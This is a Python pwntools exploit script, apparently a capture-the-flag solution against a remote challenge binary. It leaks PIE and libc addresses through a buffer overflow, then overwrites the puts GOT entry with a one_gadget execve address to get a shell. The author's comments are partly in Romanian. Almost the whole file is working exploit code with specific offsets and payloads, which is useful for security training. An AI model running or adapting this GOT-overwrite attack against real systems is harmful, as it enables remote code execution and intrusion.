from pwn import *

elf = ELF('/home/kali/Downloads/sketchy/chall')
#p = elf.process()


p=remote('34.118.61.99', 10004)

p.recvuntil(b': ')
main = int(p.recv(14), 16)
log.success(hex(main))

log.success(f'main: {hex(main)}')

log.success(elf.got['puts'])

PIE_base = main - 0x1265
log.success(f'pie base: {hex(PIE_base)}')




#size <=50 for buf
#buf size is 6*qword8 = 48
#read doesn't stop at newline, so we can input a prank
# newline that gets replaced with a 0 in the line after
# but buf is at rbp - 64 ..? LOL so we can overwrite "s" that is displayed 

#from buf to s -> 48 in buf and 8 more for v8 -> 56
#actuallly v8 is 2 byts n 6 bytes padding
#only two bytes to write in s? but 8 bytes

#yeha ida thanks a lot v8 doesnt exist :)

#56 bytes for our one then the next 8 is *p

#add a rand \n before the 50th character to bypass check

putsgot = PIE_base + elf.got['puts']



print(elf.got)

#we can modify the last two bytes -> since the dif to got is only two bytes we get got

payload = (b'\x00'*16+b'\n'+b'\x00'*39 + #padding to *p
		p64(putsgot)[:2] )
		

p.send(payload)
p.recvuntil(b'\n')

leak = p.recvn(6)
puts_leak = u64(leak.ljust(8, b'\x00'))
print(hex(puts_leak))
print(f'puts: {hex(puts_leak)}')

print(f'putsgot: {hex(putsgot)}')


#local
puts_offset = 0x585a0
system_offset = 0x2b110

#2.40
puts_offset=0x080be0
system_offset=0x51c30

#whoops it was 2.39 
puts_offset=0x87be0



libc = puts_leak - puts_offset



print(f'libc: {hex(libc)}')




# idea -> overwrite fgets with system>

#prima incercare, overwrite la puts din alarm cu system da habarnaveam cum sa schimb argumentul ala

#se dezvaluie ca trebuie one_gadget

#wait for alarm


addr_putsgot = hex(putsgot)[2:].encode()
print(addr_putsgot)
p.sendline(addr_putsgot)

execve = 0xef4ce
#execve = 0xef52b
one_gadget = libc + execve
low3 = p64(one_gadget)[:3]


p.send(low3)

#now just wait for the alarm


print("sent!")


#catch syscall exit
#catch signal SIGALRM


p.interactive()
